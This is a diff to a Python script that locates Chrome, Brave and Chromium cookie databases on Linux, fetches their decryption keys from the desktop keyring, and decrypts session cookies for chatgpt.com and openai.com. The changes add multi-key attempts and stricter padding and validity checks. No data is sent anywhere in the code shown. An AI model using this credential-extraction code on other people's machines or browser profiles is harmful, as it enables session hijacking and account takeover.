@@ -1,11 +1,9 @@
 import os
 import sqlite3
 import json
-import sys
 import shutil
-import string
 import glob
-import base64
+import re
 
 # Dependencies
 try:
@@ -17,16 +15,24 @@ try:
 except ImportError:
     HAS_DEPS = False
 
-def get_key(label_hint):
+def get_keys(label_hints):
+    keys = []
+    seen = set()
     try:
         bus = secretstorage.dbus_init()
         collection = secretstorage.get_default_collection(bus)
         for item in collection.get_all_items():
-            if label_hint.lower() in item.get_label().lower():
-                return item.get_secret()
+            label = item.get_label().lower()
+            if any(hint.lower() in label for hint in label_hints):
+                secret = item.get_secret()
+                if secret not in seen:
+                    keys.append(secret)
+                    seen.add(secret)
     except:
         pass
-    return b"peanuts"
+    if b"peanuts" not in seen:
+        keys.append(b"peanuts")
+    return keys
 
 def decrypt_v10(encrypted_value, key):
     if not encrypted_value or len(encrypted_value) < 3:
@@ -45,27 +51,26 @@ def decrypt_v10(encrypted_value, key):
         decryptor = cipher.decryptor()
         decrypted = decryptor.update(encrypted_value[3:]) + decryptor.finalize()
         
-        # Unpadding check
+        # Chromium Linux v10/v11 values use PKCS#7 padding with AES-CBC.
+        # If padding is invalid, the key is almost certainly wrong.
         padding_len = decrypted[-1]
-        if 0 < padding_len <= 16:
-            if all(decrypted[i] == padding_len for i in range(-padding_len, 0)):
-                decrypted_unpadded = decrypted[:-padding_len]
-            else:
-                decrypted_unpadded = decrypted
-        else:
-            decrypted_unpadded = decrypted
+        if padding_len < 1 or padding_len > 16:
+            return None
+        if not all(decrypted[i] == padding_len for i in range(-padding_len, 0)):
+            return None
+        decrypted_unpadded = decrypted[:-padding_len]
 
         # Handle v11 / v10 header/garbage
         # Try to find JWT start
-        jwt_start = decrypted.find(b'eyJ')
+        jwt_start = decrypted_unpadded.find(b'eyJ')
         if jwt_start != -1 and jwt_start < 48:
-            res = decrypted[jwt_start:]
+            res = decrypted_unpadded[jwt_start:]
         else:
             # Try common header offsets for v11
             found_clean = False
             for offset in [32, 28, 0]:
-                if len(decrypted) > offset:
-                    candidate = decrypted[offset:]
+                if len(decrypted_unpadded) > offset:
+                    candidate = decrypted_unpadded[offset:]
                     # Check if the first 10 chars are printable (ASCII)
                     if len(candidate) >= 10 and all(32 <= c <= 126 for c in candidate[:10]):
                         res = candidate
@@ -75,44 +80,40 @@ def decrypt_v10(encrypted_value, key):
                 res = decrypted_unpadded
 
         # Final cleanup: decode and handle padding/garbage
-        s = res.decode('utf-8', errors='ignore')
-        import re
-        
-        # Valid characters for JWT and NextAuth tokens (base64url, plus common punctuation just in case)
-        # Next.js Auth chunked tokens can end in arbitrary base64 characters.
-        valid_chars = set(string.ascii_letters + string.digits + "-_.~%|=/+")
-        
-        # We should NOT include newline or carriage return in our extraction
-        s = re.sub(r'[\r\n\t]+', '', s)
-        
-        start = 0
-        while start < len(s) and s[start] not in valid_chars:
-            start += 1
-            
-        end = len(s)
-        while end > start and s[end-1] not in valid_chars:
-            end -= 1
-            
-        res_str = s[start:end]
-        
-        # Additional safety: ensure no control characters
-        res_str = ''.join(c for c in res_str if ord(c) >= 32 and ord(c) < 127)
-        
-        if not res_str:
+        res_str = res.decode('utf-8')
+        if not is_plausible_cookie_value("", res_str):
             return None
             
         return res_str
     except:
         return None
 
+def is_plausible_cookie_value(name, value):
+    if not value:
+        return False
+
+    # RFC6265 cookie-octet, excluding DQUOTE, comma, semicolon, backslash,
+    # whitespace, and control characters. Wrong decryption often produces these.
+    if not re.fullmatch(r"[\x21\x23-\x2b\x2d-\x3a\x3c-\x5b\x5d-\x7e]+", value):
+        return False
+
+    if "session-token" in name and len(value) < 100:
+        return False
+
+    return True
+
 def extract_tokens():
     if not HAS_DEPS:
         return {"error": "DEPENDENCIES_MISSING"}
 
     browsers = [
-        {"name": "Chrome", "path": "~/.config/google-chrome/*/Cookies", "key_label": "Chrome Safe Storage"},
-        {"name": "Brave", "path": "~/.config/BraveSoftware/Brave-Browser/*/Cookies", "key_label": "Brave Safe Storage"},
-        {"name": "Chromium", "path": "~/.config/chromium/*/Cookies", "key_label": "Chromium Safe Storage"},
+        {"name": "Chrome", "path": "~/.config/google-chrome/*/Cookies", "key_labels": ["Chrome Safe Storage"]},
+        {"name": "Brave", "path": "~/.config/BraveSoftware/Brave-Browser/*/Cookies", "key_labels": ["Brave Safe Storage"]},
+        {
+            "name": "Chromium",
+            "path": "~/.config/chromium/*/Cookies",
+            "key_labels": ["Chromium Safe Storage", "Application key for org.chromium.Chromium"],
+        },
     ]
 
     # Target cookies (broaden to ensure session validity)
@@ -121,7 +122,7 @@ def extract_tokens():
     all_cookies = {}
     
     for browser in browsers:
-        key = get_key(browser["key_label"])
+        keys = get_keys(browser["key_labels"])
         search_path = os.path.expanduser(browser["path"])
         cookie_files = glob.glob(search_path)
         
@@ -132,18 +133,23 @@ def extract_tokens():
                 conn = sqlite3.connect(f"file:{temp_db}?mode=ro", uri=True)
                 cursor = conn.cursor()
                 
-                cursor.execute("SELECT name, encrypted_value FROM cookies WHERE host_key LIKE '%chatgpt.com%' OR host_key LIKE '%openai.com%'")
+                cursor.execute("SELECT name, value, encrypted_value FROM cookies WHERE host_key LIKE '%chatgpt.com%' OR host_key LIKE '%openai.com%'")
                 
-                for name, enc_val in cursor.fetchall():
+                for name, value, enc_val in cursor.fetchall():
                     if not any(t in name for t in targets):
                         continue
-                    
-                    decrypted = decrypt_v10(enc_val, key)
-                    if decrypted is None and key != b"peanuts":
-                        decrypted = decrypt_v10(enc_val, b"peanuts")
-                    
-                    if decrypted:
-                        all_cookies[name] = decrypted
+
+                    cookie_value = value if is_plausible_cookie_value(name, value) else None
+
+                    if cookie_value is None:
+                        for key in keys:
+                            cookie_value = decrypt_v10(enc_val, key)
+                            if cookie_value is not None and is_plausible_cookie_value(name, cookie_value):
+                                break
+                            cookie_value = None
+
+                    if cookie_value:
+                        all_cookies[name] = cookie_value
                 
                 conn.close()
                 if os.path.exists(temp_db): os.remove(temp_db)
